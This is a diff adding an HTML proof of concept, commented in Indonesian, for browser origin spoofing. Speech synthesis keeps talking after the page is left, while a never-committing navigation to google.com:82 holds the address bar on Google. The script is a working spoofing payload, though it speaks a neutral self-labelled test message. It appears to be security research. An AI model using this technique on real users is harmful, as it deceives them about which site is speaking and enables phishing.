@@ -1,0 +1,22 @@
+<!-- 16 | FUSI DUA KELAS - suara hidup lebih lama dari dokumennya | [1-CLICK]
+     GENOME  A=dead-port HOLD  D=S1 omnibox + permukaan AUDIO  E=TTS  F=document.write
+     MEKANISME  ini gabungan, dan itu intinya. speechSynthesis dimiliki BROWSER, bukan dokumen -
+     ia terus bicara setelah dokumen pemanggilnya ditinggalkan. Sementara itu omnibox ditahan
+     di https://www.google.com oleh navigasi yang tak pernah commit.
+     Hasilnya: pengguna MELIHAT satu origin dan MENDENGAR suara yang seolah datang dari origin itu,
+     padahal keduanya dihasilkan origin penyerang. Permukaan audio tidak punya address bar
+     sama sekali - tidak ada apa pun yang bisa membantahnya.
+     EXPECTED-SECURE  suara berhenti saat dokumen asalnya ditinggalkan, ATAU omnibox tetap jujur.
+     KELUAR  tutup tab. Teks yang diucapkan netral & menyebut dirinya PoC. -->
+<button onclick="go()">Run 16 (ada suara)</button>
+<p id=r></p>
+<script>
+document.getElementById('r').textContent = 'REAL ORIGIN: ' + location.href;
+function go() {
+  var u = new SpeechSynthesisUtterance('Ini rekaman uji riset keamanan. Suara ini berasal dari origin penyerang, bukan dari alamat yang tertulis di address bar.');
+  u.rate = 0.9; speechSynthesis.speak(u);
+  document.write('<h2>Dengarkan suaranya, lalu baca omnibox.</h2>');
+  location = 'https://www.google.com:82';
+  setInterval(function () { location = 'https://www.google.com:82'; }, 9800);
+}
+</script>
